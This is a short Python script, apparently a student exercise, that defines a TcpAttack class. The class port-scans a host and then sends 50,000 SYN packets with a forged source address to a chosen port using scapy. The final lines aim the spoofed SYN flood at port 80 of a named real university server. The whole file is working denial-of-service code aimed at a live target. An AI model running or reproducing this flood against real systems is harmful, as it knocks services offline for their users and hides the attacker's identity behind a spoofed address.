import sys
from socket import *
from scapy.all import *

class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):
        fj = open("openports.txt", "w")
        openports = []
        for port in range(rangeStart, rangeEnd):
            print "Scanning port %5d" % port,
            s = socket(AF_INET, SOCK_STREAM)
            s.settimeout(0.1) # wait 10 seconds
            try:
                s.connect((self.targetIP, port))
                print "[OPEN]"
                fj.write(str(port))
                openports.append(port)
            except Exception:
                print
            finally:
                s.close()

        fj.close()
        return openports

    def attackTarget(self, port):
        try:
            i = IP()
            t = TCP()
            i.src = self.spoofIP
            i.dst = self.targetIP
            t.sport = 10000
            t.dport = port
            t.flags = 'S'

            for x in range(50000):
                send(i/t)

        except Exception as ex:
            print "Unable to send SYN to target", ex


captive_dns_addr = gethostbyname("ecegrid.ecn.purdue.edu")
Tcp = TcpAttack('128.210.7.199', captive_dns_addr)
# Tcp.scanTarget(70, 1000)

Tcp.attackTarget(80)